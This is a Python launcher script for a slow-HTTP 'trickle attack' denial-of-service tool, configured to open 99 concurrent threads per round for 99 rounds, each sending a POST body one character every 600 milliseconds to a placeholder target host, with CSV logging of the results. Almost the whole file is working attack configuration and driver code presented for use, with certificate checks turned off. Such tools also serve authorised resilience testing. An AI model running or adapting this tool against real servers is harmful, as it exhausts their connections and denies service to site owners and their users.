'''
@author: Jason Tsang Mui Chung

License Copyright: MIT
Copyright 2020 Jason Tsang Mui Chung

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''
#Use this as the start script 
#             o>
#            ===
#            > <
#             0      
#    |\    /^   ^\    /|
#     \\  |       |  //
#      \\ / /   \ \ //
#      `[{-}.....{-}]`
#          |     |
#         /       \
#        /    /\   \
#  By: Jason Tsang Mui Chung
from Concurrent_Requests import http_request
#from Concurrent_Requests import MultiProcess #has great management points but uses to much resources
from Concurrent_Requests import MultiThread
from Concurrent_Requests import Socket_Request_HTTP
from Concurrent_Requests import Log
import time

global print_queue_list
global thread_list
global input_Print_Results_to_CSV_boolean 
print_queue_list = []
thread_list = []
  
def trickle_attack(input_Print_Results_to_CSV_boolean):
    number_of_iterations = 99 #this will send out requests in bunches (number_of_concurrent_threads X number_of_iterations ) = total requests. 
    sleep_between_iteration_seconds = 9 #
    number_of_concurrent_threads_per_iteration = 99 #this will send out requests in bunches (number_of_concurrent_threads X number_of_iterations ) = total requests. 
    input_print_status_boolean = False #DEBUG MODE TO SEE INDIVIDUAL STEPS
    #input_Print_Results_to_CSV_boolean = #moved this to main to reuse it there
    input_proxied_boolean = False
    input_SSL_Connection_boolean = True
    input_TLS_Do_Negotiation_boolean = True
    input_validate_certificate_boolean = False
    input_is_http2_boolean = False
    input_Transfer_Encoding_chunked_boolean = False#https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding
    input_host_string = "www.some_thing_you_are_going_to_attack.com"
    input_port_int = 443
    input_HTTP_Verb_string = "POST"
    input_URL_Path_string = "some/url/path?test"
    input_header_content_type_string = "application/x-www-form-urlencoded" #e.g: application/x-www-form-urlencoded
    input_http_connection_header_string = "Connection: keep-alive"
    input_http_custom_header_string = "Authorization: Basic dGVzdDpwYXNzd29yZA=="#e.g: x-custom_headerA: something1\rx-custom_headerB: something2\r
    #input_http_custom_header_string = "Transfer-Encoding: chunked" #ENABLE FOR CHUNCKED ENCODING
    input_TrickleAttack_Max_Characters_int = 600 #Max_Characters_int = auto generates a string of this size, number of chars. then calcs content length for http header based on it
    input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int = 600 #Wait_Between_Chunks_Milliseconds_int = how long to wait inbetween sending the chunks of data during a request
    input_TrickleAttack_Chunk_Size_int = 1#Chunk_Size_int = number of characters to send at a time

    #use this single request to test out values, such as input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int to see what are valid parameters for the target connection or what gets forcibly closed prematurly. Note that you should comment out the chunk of code after this one in such a case.
    '''
    Socket_Request_HTTP.Test_One_Request(
        input_print_status_boolean,
        input_proxied_boolean,
        input_SSL_Connection_boolean,
        input_TLS_Do_Negotiation_boolean,
        input_validate_certificate_boolean,
        input_is_http2_boolean,
        input_Transfer_Encoding_chunked_boolean,
        input_host_string,
        input_port_int,
        input_HTTP_Verb_string,
        input_URL_Path_string,
        input_header_content_type_string,
        input_http_connection_header_string,
        input_http_custom_header_string,
        input_TrickleAttack_Max_Characters_int,
        input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int,
        input_TrickleAttack_Chunk_Size_int,
        input_Print_Results_to_CSV_boolean,
        print_queue_list,
        thread_list
        )
    '''
    #If debugging with a single request above, you should comment out the chunk of code below in such a case.
    request_count = 0    
    for i in range(number_of_iterations):
        request_count = request_count + 1
        MultiThread.Multithread_something(
            Socket_Request_HTTP.Test_One_Request, 
            (
            input_print_status_boolean,
            input_proxied_boolean,
            input_SSL_Connection_boolean,
            input_TLS_Do_Negotiation_boolean,
            input_validate_certificate_boolean,
            input_is_http2_boolean,
            input_Transfer_Encoding_chunked_boolean,
            input_host_string,
            input_port_int,
            input_HTTP_Verb_string,
            input_URL_Path_string,
            input_header_content_type_string,
            input_http_connection_header_string,
            input_http_custom_header_string,
            input_TrickleAttack_Max_Characters_int,
            input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int,
            input_TrickleAttack_Chunk_Size_int,
            input_Print_Results_to_CSV_boolean,
            print_queue_list,
            thread_list
            ), 
            number_of_concurrent_threads_per_iteration,
            thread_list
            )
        time.sleep( sleep_between_iteration_seconds )


#this is just a regular http client - not actually used for anything. Just here as a template to help test connections and debug things    
def http_client_connection(number_of_iterations, sleep_between_iteration_seconds, number_of_concurrent_threads_per_iteration):
    conn = http_request.Create()
    number_of_iterations = 10
    sleep_between_iteration_seconds = 0.5
    number_of_concurrent_threads_per_iteration =100 #this will send out requests in bunches (number_of_concurrent_threads X number_of_iterations ) = total requests. 
    
    use_proxy_boolean = False
    use_ssl_boolean = True
    validate_sslcert_boolean = False
    hostname = 'www.some_thing_you_are_going_to_attack.com' #make sure to put for example www.domain.com vs https://www.domain.com
    port_integer = 443
    timeout_seconds_integer = 60
    urlpath = '/random/url/path?test=jello&jello=test'
    headers_keypairs = {
        'Origin': 'www.someorigin.com',
        'Content-type': 'application/json'
    }
    request_count = 0    
    
    for i in range(number_of_iterations):
        request_count = request_count + 1
        MultiThread.Multithread_something(conn.Request_GET, (use_proxy_boolean, use_ssl_boolean, validate_sslcert_boolean, hostname, port_integer, timeout_seconds_integer, urlpath+"_"+str(request_count), headers_keypairs), number_of_concurrent_threads_per_iteration)
        time.sleep( sleep_between_iteration_seconds )
    
    
if __name__ == '__main__':
    
    input_Print_Results_to_CSV_boolean = True #turn is on or off depending on if you want to record the traffic behavior to csv
    print("start attack")
    
    #start attack
    trickle_attack(input_Print_Results_to_CSV_boolean)

    #start the printer
    if(input_Print_Results_to_CSV_boolean):
        logfilename = "C:\\Users\\me\Documents\\test"+str(time.time())+".csv"
        Log.TrickleAttack_to_csv_print_headersinfile(logfilename)
        Log.start_printer_csv_MultiThreaded(print_queue_list, logfilename ,thread_list)
        
    # Wait for all of the threads them to finish
    for x in thread_list:
        x.join()
    thread_list.clear()
    print("All Threads Done ")
    
    if(input_Print_Results_to_CSV_boolean):
        while((len(thread_list) > 0) or (len(print_queue_list)>0)):
            time.sleep(3) #wait every 3 seconds.. for printing to finish - technically printing is on its own thread but wait on main just for user expereince
    print("Attack is Finished!")